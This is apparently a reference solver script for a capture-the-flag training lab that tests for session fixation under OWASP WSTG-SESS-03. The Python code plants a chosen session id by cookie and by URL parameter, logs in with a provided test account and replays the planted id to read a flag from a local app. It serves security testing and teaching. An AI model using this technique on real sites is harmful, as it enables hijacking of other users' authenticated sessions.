#!/usr/bin/env python3
"""Masquerade Operation 02 reference solver -- Zero plants a key card before check-in.

WSTG-SESS-03: Testing for Session Fixation. Visit the login page BEFORE authenticating and
note the session identifier the server hands you. Log in while continuing to present that
same identifier. If the app never rotates it on authentication, the pre-auth identifier you
picked is now trusted -- that's the finding, not a puzzle to solve.

Also demonstrates the secondary WSTG-SESS-03 checklist item: the session identifier is
accepted just as readily via a `?resort_sid=` URL parameter as it is via the cookie.

Usage: python3 solver.py [base_url]     (default http://localhost:8000)
"""
import sys, re, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
USER = "guest.stay"
PASSWORD = "Coastline2024!"


def main():
    print("[*] Path 1 -- cookie-based fixation")
    planted_sid = "PWNED-BY-ZERO-4471"
    print(f"[*] planting our own session id BEFORE authenticating: {planted_sid!r}")

    r = requests.get(f"{BASE}/masquerade/op2/", cookies={"resort_sid": planted_sid})
    print(f"[*] server's response to the pre-auth visit: HTTP {r.status_code}, "
          f"resort_sid Set-Cookie present: {'resort_sid' in r.headers.get('set-cookie', '')}")

    print(f"[*] logging in as the provided test account ({USER}), presenting the SAME sid")
    requests.post(f"{BASE}/masquerade/op2/login", cookies={"resort_sid": planted_sid},
                   data={"username": USER, "password": PASSWORD})

    print("[*] replaying our own planted sid -- never handed a server-issued one at all")
    res = requests.get(f"{BASE}/masquerade/op2/reservations", cookies={"resort_sid": planted_sid})
    flag = re.search(r"R6S\{[^}]*\}", res.text)
    if flag:
        print(f"[+] the planted key card is now authenticated: {flag.group(0)}")
    else:
        print(f"[!] planted sid was not accepted (HTTP {res.status_code})")

    print("\n[*] Path 2 -- secondary finding: same trick, via URL parameter instead of a cookie")
    sid_via_url = "URL-PLANTED-9999"
    sess = requests.Session()
    sess.get(f"{BASE}/masquerade/op2/?resort_sid={sid_via_url}")
    sess.post(f"{BASE}/masquerade/op2/login", data={"username": USER, "password": PASSWORD})
    res2 = sess.get(f"{BASE}/masquerade/op2/reservations")
    flag2 = re.search(r"R6S\{[^}]*\}", res2.text)
    print(f"[{'+' if flag2 else '!'}] URL-parameter-planted sid accepted: {bool(flag2)}")


if __name__ == "__main__":
    main()
